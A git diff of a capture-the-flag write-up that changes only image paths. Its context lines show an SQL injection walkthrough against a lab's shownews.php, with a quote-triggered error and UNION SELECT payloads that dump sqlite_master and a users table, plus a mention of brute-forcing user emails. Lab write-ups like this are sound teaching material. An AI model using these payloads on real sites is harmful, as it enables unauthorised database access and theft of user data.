@@ -4,7 +4,7 @@
 #### Try to cause error in php prameter
 `http://wcamxwl32pue3e6mk873oykcwzy0j6zqdkgxu639-web.cybertalentslabs.com/shownews.php?id=%27`
 
-![alt text](image-2.png)
+![alt text](images/image-2.png)
 
 The error is for `SQLite` 
 
@@ -12,7 +12,7 @@ The error is for `SQLite`
 ```sql
 UNION select * from sqlite_master
 ```
-![alt text](image-1.png)
+![alt text](images/image-1.png)
 
 We found 2 tables nxf8_news , nxf8_users
 
@@ -20,14 +20,14 @@ We found 2 tables nxf8_news , nxf8_users
 UNION select * from nxf8_users
 ```
 
-![alt text](image.png)
+![alt text](images/image.png)
 
 We found all users 
 
 In description we need to find admin email
 
 #### Review source code
-![alt text](image-3.png) 
+![alt text](images/image-3.png) 
 
 Try to Bruteforce of all users emails 
 *All users emails in [emails](emails.txt) file*
